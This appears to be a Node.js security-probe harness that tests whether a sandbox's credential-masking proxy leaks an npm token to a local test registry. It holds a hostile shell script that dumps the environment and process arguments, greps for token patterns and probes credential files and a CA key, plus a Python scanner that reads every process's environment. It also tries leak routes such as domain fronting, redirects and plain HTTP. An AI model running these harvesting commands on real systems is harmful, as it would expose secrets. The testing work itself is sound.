// README: P44 safety probes S1 to S9 for the credential-masking proxy. Hostile commands (curl, ps, grep, a small Node script) run inside srt against the local test registry, once with mechanism A (srt credentials.envVars mask, CLI settings file) and once with mechanism B (own placeholder, SandboxManager as a library with network.filterRequest). The registry log shows what arrived; the scan looks for the real secret in everything the sandbox printed and in files it could read. Usage: node probes/p44_safety.mjs [group ...] with groups s1 s2 s3 s4 s5 s6 s7 (default all). Evidence: probes/out/p44_safety_<group>.json.
import { mkdirSync, writeFileSync, readFileSync, readdirSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import tls from 'node:tls';
import { tmpdir } from 'node:os';
import { createHash } from 'node:crypto';
import { fresh, cleanup, write, startRegistry, makeSecrets, makePlaceholders, baseEnv, baseSettings, runSrt, runWrapped, loadSrtLib, scanFor, HOSTS, freeGiB } from './p_cred_lib.mjs';

const OUT = join(dirname(fileURLToPath(import.meta.url)), 'out');
mkdirSync(OUT, { recursive: true });
const groups = process.argv.slice(2).length ? process.argv.slice(2) : ['s1', 's2', 's3', 's4', 's5', 's6', 's7'];

const dir = fresh('safety');
const home = join(dir, 'home'), work = join(dir, 'work'), tmp = join(home, 'tmp');
for (const d of [home, work, tmp]) mkdirSync(d, { recursive: true });
const secrets = makeSecrets(), ph = makePlaceholders();
const reg = await startRegistry({ dir, secrets });
for (const v of Object.values(ph)) reg.fakes.add(v);
const lib = await loadSrtLib();
const SM = lib.SandboxManager;
tls.setDefaultCACertificates([...tls.getCACertificates('default'), readFileSync(reg.caPem, 'utf8')]);
const P = reg.port, PP = reg.plainPort;
const NP = 'export NO_PROXY= no_proxy=;';
const REAL = secrets.npm; // the secret under test is the npm token in variable TOK
const slim = (e) => ({ scheme: e.scheme, host: e.host, method: e.method, url: e.url.slice(0, 80), kind: e.kind, auth: e.auth ? e.auth.replace(REAL, '<REAL>').replace(ph.npm, '<PLACEHOLDER>').replace(/fake_value_[0-9a-f-]+[a-z0-9_-]*/, '<SENTINEL>').slice(0, 80) : null, status: e.status, body: e.body ? e.body.replace(REAL, '<REAL>').replace(ph.npm, '<PLACEHOLDER>').replace(/fake_value_[0-9a-f-]+[a-z0-9_-]*/, '<SENTINEL>').slice(0, 80) : undefined });
const redact = (s) => String(s).split(REAL).join('<REAL>').split(ph.npm).join('<PLACEHOLDER>').replace(/fake_value_[0-9a-f-]+[a-z0-9_-]*/g, '<SENTINEL>');
const seesReal = (s) => String(s).includes(REAL) || String(s).includes(secrets.maven) || String(s).includes(secrets.cargo);

// A filter for mechanism B. opts: { hosts, schemeGuard, paths, headers, body, onResponse }
function filterB({ hosts = [HOSTS.inject], schemeGuard = true, paths, methods, anyHeader = false, onResponse, log } = {}) {
  return async (request, info) => {
    const host = (info?.target?.host || new URL(request.url).hostname).toLowerCase();
    const path = new URL(request.url).pathname;
    const dec = { action: 'allow' };
    log?.({ host, scheme: info?.scheme, path, method: request.method });
    if (hosts.includes(host) && (!schemeGuard || info?.scheme === 'https') && (!paths || paths.some((p) => path.startsWith(p))) && (!methods || methods.includes(request.method))) {
      const sets = [];
      for (const [name, value] of request.headers) {
        if (!anyHeader && name !== 'authorization') continue;
        if (value.includes(ph.npm)) sets.push([name, value.split(ph.npm).join(REAL)]);
      }
      if (sets.length) dec.setHeaders = sets;
    }
    if (onResponse) dec.onResponse = onResponse;
    return dec;
  };
}

// Runs one command. mech A: CLI settings with the credentials block; mech B: library with filterRequest. net/creds/filter are per-case tweaks.
async function trial(mech, label, cmd, { net = {}, creds, filter, extraEnv = {}, extraDeny = [], fs = {}, full = false, envReal = {} } = {}) {
  const mark = reg.mark();
  let r;
  const settingsBase = baseSettings({ registry: reg, work, tmp, extraDeny, filesystem: { allowWrite: [work, tmp], ...fs } });
  settingsBase.network = { ...settingsBase.network, ...net };
  const env0 = baseEnv(home, extraEnv);
  let violations = [];
  if (mech === 'A') {
    const credentials = creds ?? { envVars: [{ name: 'TOK', mode: 'mask', injectHosts: [HOSTS.inject] }] };
    const s = { ...settingsBase, credentials };
    r = await runSrt({ settings: s, cmd: `${NP} ${cmd}`, env: { ...env0, NODE_EXTRA_CA_CERTS: reg.caPem, TOK: REAL, ...envReal }, cwd: work, dir });
  } else {
    const cfg = { ...settingsBase, network: { ...settingsBase.network, filterRequest: filter || filterB() } };
    await SM.initialize(cfg);
    r = await runWrapped(SM, `${NP} ${cmd}`, { env: { ...env0, TOK: ph.npm }, cwd: work });
    violations = SM.getSandboxViolationStore().getViolations().map((v) => v.line).slice(0, 8);
    await SM.reset();
  }
  const seen = reg.since(mark);
  const out = r.stdout + r.stderr;
  return { mech, label, cmd: redact(cmd).slice(0, 400), code: r.code, ms: r.ms, stdout: redact(r.stdout).slice(0, full ? 200000 : 2500), stderr: redact(r.stderr).slice(0, 800), sandboxSawReal: seesReal(out), registry: seen.map(slim), violations };
}

// Hostile script files (written once; used by s1 and s1b).
const hostile = `
echo "== env"; env | sort
echo "== ps args"; ps -axww -o pid,ppid,user,command
echo "== ps with environment (line counts only, nothing stored)"; ps -E -p $$ -o pid,command 2>&1 | wc -l; ps -axwwE -o pid,command 2>&1 | wc -l
echo "== grep shaped secrets under temp areas"; grep -rIao -E 'npm_[A-Za-z0-9]{36}|cio[A-Za-z0-9]{32}' ${dir} /tmp/claude 2>/dev/null | sed 's/.*/<shaped match>/' | sort | uniq -c | head -20
echo "== real credential files: open for reading without reading a byte"; for f in .npmrc .cargo/credentials.toml .m2/settings.xml .gradle/gradle.properties; do if head -c 0 "$HOME_REAL/$f" >/dev/null 2>&1; then echo "$f: opened"; else echo "$f: refused or missing"; fi; done
echo "== mitm CA key in the srt temp dir"; ls -la $HOST_TMP/srt-ca-*/ 2>&1 | head -12; head -c 27 $HOST_TMP/srt-ca-*/ca.key 2>&1 | head -2; echo
echo "== trust bundle and srt temp"; ls -la $TMPDIR | head; ls -la /tmp/claude 2>&1 | head -5
`;
write(join(dir, 'procscan.py'), String.raw`import ctypes, ctypes.util, re, os, hashlib, struct
libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
pat = re.compile(rb'(npm_[A-Za-z0-9]{36}|cio[A-Za-z0-9]{32}|fake_value_[0-9a-f]{8}-[0-9a-f-]{27})')
readable = 0; denied = 0; hits = []
buf = ctypes.create_string_buffer(1 << 20)
for pid in range(1, 100000):
  mib = (ctypes.c_int * 3)(1, 49, pid)
  size = ctypes.c_size_t(len(buf))
  r = libc.sysctl(mib, 3, buf, ctypes.byref(size), None, 0)
  if r != 0:
      if ctypes.get_errno() == 1: denied += 1
      continue
  readable += 1
  raw = buf.raw[:size.value]
  argc = struct.unpack('i', raw[:4])[0]
  parts = raw[4:].split(b'\0')
  execp = parts[0].decode(errors='replace')
  rest = [x for x in parts[1:] if x]
  for m in set(pat.findall(raw)):
      where = 'argv' if any(m in x for x in rest[:argc]) else 'environment'
      hits.append({'pid': pid, 'kind': m[:4].decode(errors='replace'), 'len': len(m), 'sha12': hashlib.sha256(m).hexdigest()[:12], 'where': where, 'exec': os.path.basename(execp)})
print('procargs2 readable', readable, 'EPERM', denied, 'own pid', os.getpid(), 'ppid', os.getppid())
for h in hits: print('MATCH', h)
`);
write(join(dir, 'hostile.sh'), hostile + `echo "== procargs2 via sysctl (python ctypes), all pids"; /usr/bin/python3 ${join(dir, 'procscan.py')} 2>&1 | head -12\n`);

const results = {};
const save = (g) => writeFileSync(join(OUT, `p44_safety_${g}.json`), JSON.stringify(results[g], null, 2));
const echoCurl = (host, extra = '', hdr = 'Authorization: Bearer $TOK') => `curl -sS -m 20 -i -H "${hdr}" ${extra} https://${host}:${P}/echo`;
const echoSummary = (t) => { const m = /\{"method".*\}/s.exec(t.stdout); let reflected = null; try { reflected = JSON.parse(m[0]).headers.authorization ?? null; } catch {} return reflected; };

async function both(g, label, cmd, opts = {}) {
  for (const mech of ['A', 'B']) {
    const o = typeof opts === 'function' ? opts(mech) : opts;
    if (o === null) continue;
    const t = await trial(mech, label, cmd, o);
    (results[g] ||= []).push(t);
    console.log(`[${g}] ${mech} ${label}: code=${t.code} sandboxSawReal=${t.sandboxSawReal} registry=${t.registry.map((e) => `${e.scheme}:${e.host.split(':')[0]}${e.url.slice(0, 22)}=${e.kind}`).join(' ; ')}`);
  }
}

if (groups.includes('s1')) {
  // S1: where could the real secret be read in the sandbox. A hostile script dumps the environment, the process list with arguments, the environment of other processes, and greps what it can read.
  const realHome = process.env.HOME;
  await both('s1', 'hostile dump', `export HOME_REAL=${realHome}; bash ${join(dir, 'hostile.sh')}`, (m) => ({ full: true, extraEnv: { HOST_TMP: m === 'A' ? tmp : tmpdir() } }));
  // Files readable by the sandbox that hold the real secret: host-side exact scan of the run directory, the srt temp areas and /tmp/claude.
  const sha12 = (x) => createHash('sha256').update(x).digest('hex').slice(0, 12);
  for (const t of results.s1.slice(0, 2)) { const ms = [...t.stdout.matchAll(/MATCH \{[^\n]*'sha12': '([0-9a-f]{12})'[^\n]*\}/g)]; t.procargsMatchesReal = ms.filter((m) => m[1] === sha12(REAL)).length; t.procargsMatchLines = [...t.stdout.matchAll(/MATCH [^\n]*/g)].map((m) => m[0].slice(0, 260)); }
  const srtTemps = readdirSync(tmpdir()).filter((n) => n.startsWith('srt-')).map((n) => join(tmpdir(), n));
  const hits = scanFor([dir, '/tmp/claude', ...srtTemps], [REAL, secrets.maven, secrets.cargo]);
  results.s1.push({ label: 'host-side scan of run dir, /tmp/claude and srt temp dirs', hits: hits.map((h) => h.file.replace(dir, '<run>')), srtTempDirsScanned: srtTemps.length });
  save('s1');
}

if (groups.includes('s1b')) {
  // S1b: mechanism A through the library. The real value is put into process.env of the host at run time (not at exec time) and read by srt from there; the wrapped command gets an explicit environment without it.
  const settings = baseSettings({ registry: reg, work, tmp, filesystem: { allowWrite: [work, tmp] } });
  settings.credentials = { envVars: [{ name: 'TOK', mode: 'mask', injectHosts: [HOSTS.inject] }] };
  const mark = reg.mark();
  await SM.initialize(settings);
  process.env.TOK = REAL;
  const env = baseEnv(home);
  const r1 = await runWrapped(SM, `${NP} export HOME_REAL=${process.env.HOME}; bash ${join(dir, 'hostile.sh')}`, { env, cwd: work });
  const r2 = await runWrapped(SM, `${NP} curl -sS -m 20 -H "Authorization: Bearer $TOK" https://${HOSTS.inject}:${P}/echo`, { env, cwd: work });
  delete process.env.TOK;
  const r3 = await runWrapped(SM, `${NP} echo "TOK=[$TOK]"; curl -sS -m 20 -H "Authorization: Bearer $TOK" https://${HOSTS.inject}:${P}/echo`, { env, cwd: work });
  await SM.reset();
  const sha12 = (x) => createHash('sha256').update(x).digest('hex').slice(0, 12);
  const lines = [...r1.stdout.matchAll(/MATCH [^\n]*/g)].map((m) => redact(m[0]).slice(0, 260));
  const matchesReal = [...r1.stdout.matchAll(/'sha12': '([0-9a-f]{12})'/g)].filter((m) => m[1] === sha12(REAL)).length;
  results.s1b = [{ label: 'A through the library, secret set into process.env at run time', matchesReal, procargsMatchLines: lines, wrap1SawReal: seesReal(r1.stdout + r1.stderr), tokInSandboxEnv: (r1.stdout.match(/^TOK=.*$/m) || [''])[0].replace(/fake_value_[0-9a-f-]+[a-z0-9_-]*/, '<SENTINEL>'), registry: reg.since(mark).map(slim), afterDelete: { stdout: redact(r3.stdout).slice(0, 400), sawReal: seesReal(r3.stdout) } }];
  console.log('[s1b]', JSON.stringify(results.s1b[0]).slice(0, 1200));
  save('s1b');
}

if (groups.includes('s1c')) {
  // S1c: mechanism A through the CLI with a wrapper that receives the secret on stdin and sets process.env at run time, then loads srt's cli.js in the same process. The srt process then has no exec-time environment entry for it.
  const { spawn } = await import('node:child_process');
  const { srtPackageDir } = await import('./p_cred_lib.mjs');
  write(join(dir, 'srt-wrapper.mjs'), `import { readFileSync } from 'node:fs';\nprocess.env.TOK = readFileSync(0, 'utf8').trim();\nawait import(${JSON.stringify(join(srtPackageDir(), 'dist', 'cli.js'))});\n`);
  const settings = baseSettings({ registry: reg, work, tmp, filesystem: { allowWrite: [work, tmp] } });
  settings.credentials = { envVars: [{ name: 'TOK', mode: 'mask', injectHosts: [HOSTS.inject] }] };
  const f = join(dir, 'settings-wrapper.json'); writeFileSync(f, JSON.stringify(settings));
  const mark = reg.mark();
  const run = (cmd) => new Promise((res) => { const c = spawn('node', [join(dir, 'srt-wrapper.mjs'), '--settings', f, '-c', cmd], { cwd: work, env: { ...baseEnv(home, { NODE_EXTRA_CA_CERTS: reg.caPem, HOST_TMP: tmp }) }, stdio: ['pipe', 'pipe', 'pipe'] }); let o = '', e = ''; c.stdout.on('data', (d) => (o += d)); c.stderr.on('data', (d) => (e += d)); c.stdin.end(REAL); c.on('close', (code) => res({ code, stdout: o, stderr: e })); });
  const r1 = await run(`${NP} export HOME_REAL=${process.env.HOME}; bash ${join(dir, 'hostile.sh')}`);
  const r2 = await run(`${NP} curl -sS -m 20 -H "Authorization: Bearer $TOK" https://${HOSTS.inject}:${P}/echo`);
  const sha12 = (x) => createHash('sha256').update(x).digest('hex').slice(0, 12);
  const matchesReal = [...r1.stdout.matchAll(/'sha12': '([0-9a-f]{12})'/g)].filter((m) => m[1] === sha12(REAL)).length;
  results.s1c = [{ label: 'A through the CLI, secret delivered on stdin and set into process.env at run time', matchesReal, procargsMatchLines: [...r1.stdout.matchAll(/MATCH [^\n]*/g)].map((m) => redact(m[0]).slice(0, 220)), sandboxSawReal: seesReal(r1.stdout + r1.stderr), registry: reg.since(mark).map(slim), code: [r1.code, r2.code] }];
  console.log('[s1c]', JSON.stringify(results.s1c[0]).slice(0, 900));
  save('s1c');
}

if (groups.includes('s2')) {
  // S2: a request to a host that is not in injectHosts, and host spellings around the inject host.
  await both('s2', 'other host', echoCurl(HOSTS.other));
  await both('s2', 'subdomain of the inject host', echoCurl(HOSTS.sub));
  await both('s2', 'upper-case host name', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" https://REGISTRY.LOCALHOST:${P}/echo`);
  await both('s2', 'ip literal 127.0.0.1', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" https://127.0.0.1:${P}/echo -H "Host: registry.localhost:${P}"`);
  await both('s2', 'trailing dot host', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" https://registry.localhost.:${P}/echo`);
  await both('s2', 'injectHosts omitted (A default = allowedDomains)', echoCurl(HOSTS.other), (m) => (m === 'A' ? { creds: { envVars: [{ name: 'TOK', mode: 'mask' }] } } : { filter: filterB({ hosts: [HOSTS.inject, HOSTS.other, HOSTS.excluded, HOSTS.sub] }) }));
  save('s2');
}

if (groups.includes('s3')) {
  // S3: the echo endpoint on an inject host reflects the Authorization header back to the sandbox.
  await both('s3', 'echo on inject host', echoCurl(HOSTS.inject));
  await both('s3', 'echo + stripResponseHeaders', echoCurl(HOSTS.inject), { net: { stripResponseHeaders: ['x-echo-authorization', 'set-cookie'] } });
  const seenResp = [];
  await both('s3', 'echo + onResponse observer that tries to redact', echoCurl(HOSTS.inject), (m) => (m === 'A' ? null : { filter: filterB({ onResponse: (status, headers) => { seenResp.push({ status, headerNames: Object.keys(headers), bodyArgument: false }); headers['x-echo-authorization'] = 'REDACTED'; delete headers['set-cookie']; } }) }));
  results.s3.push({ label: 'onResponse arguments', seen: seenResp.slice(0, 2) });
  await both('s3', 'echo + path-scoped substitution (B only)', echoCurl(HOSTS.inject), (m) => (m === 'A' ? null : { filter: filterB({ paths: ['/npm/', '/maven/', '/cargo/'] }) }));
  save('s3');
}

if (groups.includes('s4')) {
  // S4: plain http with the placeholder.
  const plain = `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" http://${HOSTS.inject}:${PP}/echo`;
  await both('s4', 'plain http, defaults', plain);
  await both('s4', 'plain http, naive filter without scheme guard (B) / allowPlaintextInject (A)', plain, (m) => (m === 'A' ? { creds: { allowPlaintextInject: true, envVars: [{ name: 'TOK', mode: 'mask', injectHosts: [HOSTS.inject] }] } } : { filter: filterB({ schemeGuard: false }) }));
  await both('s4', 'plain http, naive filter + allowPlaintextHeaderSet (B)', plain, (m) => (m === 'A' ? null : { filter: filterB({ schemeGuard: false }), net: { allowPlaintextHeaderSet: true } }));
  await both('s4', 'absolute-URI https through the plain proxy listener', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" --proxy-header 'X: y' -x "$HTTP_PROXY" http://${HOSTS.inject}:${PP}/echo`);
  save('s4');
}

if (groups.includes('s5')) {
  // S5: opaque tunnels and host matching.
  const excl = `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" https://${HOSTS.excluded}:${P}/echo`;
  await both('s5', 'excluded domain, defaults (not terminated)', excl);
  await both('s5', 'excluded domain + refuseOpaqueTunnels', excl, { net: { refuseOpaqueTunnels: true } });
  const proxyUrl = `$(node -e "const u=new URL(process.env.HTTPS_PROXY); console.log('socks5h://'+u.username+':'+u.password+'@'+u.host)")`;
  await both('s5', 'SOCKS5 to the inject host (end-to-end TLS), defaults', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" --proxy ${proxyUrl} https://${HOSTS.inject}:${P}/echo`);
  await both('s5', 'SOCKS5 + refuseOpaqueTunnels', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" --proxy ${proxyUrl} https://${HOSTS.inject}:${P}/echo`, { net: { refuseOpaqueTunnels: true } });
  await both('s5', 'CONNECT carrying plain http (non-TLS) to the plain port, defaults', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" --proxytunnel -x "$HTTP_PROXY" http://${HOSTS.inject}:${PP}/echo`);
  await both('s5', 'same + refuseOpaqueTunnels', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" --proxytunnel -x "$HTTP_PROXY" http://${HOSTS.inject}:${PP}/echo`, { net: { refuseOpaqueTunnels: true } });
  // Fronting: CONNECT to the other host, SNI and Host name the inject host.
  const front = `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" --connect-to ${HOSTS.inject}:${P}:${HOSTS.other}:${P} https://${HOSTS.inject}:${P}/echo`;
  await both('s5', 'fronting: CONNECT other, SNI+Host inject, defaults', front);
  await both('s5', 'fronting + requireHostMatch', front, { net: { requireHostMatch: true } });
  await both('s5', 'Host header differs from CONNECT target (inject), defaults', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" -H "Host: ${HOSTS.other}:${P}" https://${HOSTS.inject}:${P}/echo`);
  await both('s5', 'Host header differs + requireHostMatch', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" -H "Host: ${HOSTS.other}:${P}" https://${HOSTS.inject}:${P}/echo`, { net: { requireHostMatch: true } });
  save('s5');
}

if (groups.includes('s6')) {
  // S6: other routes to the substitution.
  await both('s6', 'placeholder in URL query', `curl -sS -m 20 -i "https://${HOSTS.inject}:${P}/echo?t=$TOK"`);
  await both('s6', 'placeholder in URL path', `curl -sS -m 20 -i "https://${HOSTS.inject}:${P}/echo/$TOK"`);
  await both('s6', 'placeholder in request body', `curl -sS -m 20 -i -d "t=$TOK" https://${HOSTS.inject}:${P}/echo`);
  await both('s6', 'placeholder in another header (X-Api-Key)', echoCurl(HOSTS.inject, '', 'X-Api-Key: $TOK'));
  await both('s6', 'placeholder inside base64 in Authorization (Basic)', `curl -sS -m 20 -i -u "u:$TOK" https://${HOSTS.inject}:${P}/echo`);
  await both('s6', 'redirect inject -> other, client resends header (--location-trusted)', `curl -sS -m 20 -i -L --location-trusted -H "Authorization: Bearer $TOK" "https://${HOSTS.inject}:${P}/redirect?to=https://${HOSTS.other}:${P}/echo"`);
  await both('s6', 'redirect other -> inject, client resends header (--location-trusted)', `curl -sS -m 20 -i -L --location-trusted -H "Authorization: Bearer $TOK" "https://${HOSTS.other}:${P}/redirect?to=https://${HOSTS.inject}:${P}/echo"`);
  await both('s6', 'TRACE to the inject host', echoCurl(HOSTS.inject, '-X TRACE'));
  await both('s6', 'sentinel of credential 1 sent to the inject host of credential 2 (A only)', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" https://${HOSTS.other}:${P}/echo; echo; echo "TOK2 is $TOK2" | sed 's/second-secret-value-0123456789/<REAL2>/'; curl -sS -m 20 -i -H "Authorization: Bearer $TOK2" https://${HOSTS.other}:${P}/echo | tail -1 | cut -c1-200`, (m) => (m === 'A' ? { creds: { envVars: [{ name: 'TOK', mode: 'mask', injectHosts: [HOSTS.inject] }, { name: 'TOK2', mode: 'mask', injectHosts: [HOSTS.other] }] }, envReal: { TOK2: 'second-secret-value-0123456789' } } : null));
  save('s6');
}

if (groups.includes('s7')) {
  // S7: derived values. An HMAC over the placeholder, and what a tool prints about the sentinel.
  await both('s7', 'HMAC signature computed over the placeholder', `SIG=$(printf %s "GET /echo" | openssl dgst -sha256 -hmac "$TOK" | awk '{print $NF}'); curl -sS -m 20 -i -H "Authorization: HMAC $SIG" https://${HOSTS.inject}:${P}/echo`);
  await both('s7', 'env and tool output show the value inside the sandbox', `echo "TOK=$TOK"; printf '%s' "$TOK" | wc -c; npm config get userconfig >/dev/null 2>&1; node -e "console.log('node sees', process.env.TOK.length, 'chars')"`);
  save('s7');
}

if (groups.includes('s9')) {
  // S9: the sandbox can use the substituted credential for any request the token allows, for example a write.
  await both('s9', 'PUT with the placeholder to the inject host (publish-like write)', `curl -sS -m 20 -i -X PUT -d payload -H "Authorization: Bearer $TOK" https://${HOSTS.inject}:${P}/npm/probe-pkg`);
  await both('s9', 'PUT with method scoping GET/HEAD (B only)', `curl -sS -m 20 -i -X PUT -d payload -H "Authorization: Bearer $TOK" https://${HOSTS.inject}:${P}/npm/probe-pkg`, (m) => (m === 'A' ? null : { filter: filterB({ methods: ['GET', 'HEAD'] }) }));
  await both('s9', 'GET with method scoping (B only, control)', `curl -sS -m 20 -i -H "Authorization: Bearer $TOK" https://${HOSTS.inject}:${P}/npm/probe-pkg`, (m) => (m === 'A' ? null : { filter: filterB({ methods: ['GET', 'HEAD'] }) }));
  save('s9');
}

if (groups.includes('s8')) {
  // S8: what the credentials block does with files and with mode deny on this platform (macOS).
  write(join(home, 'plain.token'), `${REAL}\n`);
  write(join(home, 'rc.ini'), `token=${REAL}\nother=1\n`);
  const cred = { envVars: [{ name: 'DENYME', mode: 'deny' }, { name: 'TOK', mode: 'mask', injectHosts: [HOSTS.inject] }], files: [{ path: join(home, 'plain.token'), mode: 'mask' }, { path: join(home, 'rc.ini'), mode: 'mask', extract: 'token=(\\S+)' }] };
  const t = await trial('A', 'deny env, mask file whole, mask file with extract', `echo "DENYME=[$DENYME]"; echo "plain:"; cat ${join(home, 'plain.token')} 2>&1; echo "rc.ini:"; cat ${join(home, 'rc.ini')} 2>&1; echo "TOK=$TOK" | cut -c1-20`, { creds: cred, envReal: { DENYME: 'deny-me-value-xyz' } });
  results.s8 = [t];
  console.log('[s8]', t.stdout.replace(/\n/g, ' // '), t.stderr.slice(0, 300));
  save('s8');
}

console.log('free GiB', freeGiB());
await reg.close();
cleanup(dir);
